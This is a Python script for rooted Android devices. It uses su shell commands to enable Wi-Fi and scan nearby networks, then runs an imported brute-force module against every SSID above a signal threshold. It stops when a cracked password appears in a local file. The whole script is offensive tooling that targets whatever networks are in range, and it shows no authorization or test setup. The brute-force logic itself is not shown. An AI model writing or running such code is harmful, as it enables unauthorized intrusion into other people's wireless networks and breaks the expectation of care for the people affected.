import subprocess
import time
from brute_forcer import BruteForcer  # assumes your file is named brute_wifi.py

SIGNAL_THRESHOLD = -80  # dBm; ignore very weak signals


def run_cmd(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.returncode, result.stdout.strip(), result.stderr.strip()


def scan_networks():
    print("📡 Scanning available Wi-Fi networks...")
    code, out, err = run_cmd("su -c 'cmd -l wifi list-networks'")

    if code != 0 or "SSID" not in out:
        print("⚠️ Fallback: using dumpsys wifi scan results")
        code, out, err = run_cmd("su -c 'dumpsys wifi | grep -E \"SSID:|signal:|level:\"'")

    networks = []
    ssid = None
    for line in out.splitlines():
        if "SSID:" in line:
            ssid = line.split("SSID:")[-1].strip()
        elif "signal" in line or "level" in line:
            signal_str = line.strip().split()[-1]
            try:
                signal = int(signal_str)
            except:
                signal = -100
            if ssid and signal >= SIGNAL_THRESHOLD:
                networks.append((ssid, signal))
                ssid = None  # reset
    return networks


def main():
    print("🔧 Enabling Wi-Fi before scanning...")
    run_cmd("su -c 'svc wifi enable'")
    time.sleep(3)

    scanned = scan_networks()
    if not scanned:
        print("❌ No Wi-Fi networks found.")
        return

    # Remove duplicates
    unique_ssids = list({s[0]: s for s in scanned}.values())
    print(f"✅ Found {len(unique_ssids)} candidate networks to try.")

    for ssid, signal in unique_ssids:
        print(f"\n🚀 Attacking SSID: {ssid} (Signal: {signal} dBm)")

        attacker = BruteForcer(ssid)
        attacker.main()

        # Check if password was cracked
        if check_cracked_file_for_ssid(ssid):
            print(f"🎉 Password for '{ssid}' found. Stopping.")
            break
    else:
        print("💀 Finished trying all networks. No password cracked.")


def check_cracked_file_for_ssid(ssid):
    try:
        with open("cracked.txt", "r") as f:
            for line in f:
                if line.startswith(ssid + ":"):
                    return True
    except:
        pass
    return False


if __name__ == "__main__":
    main()
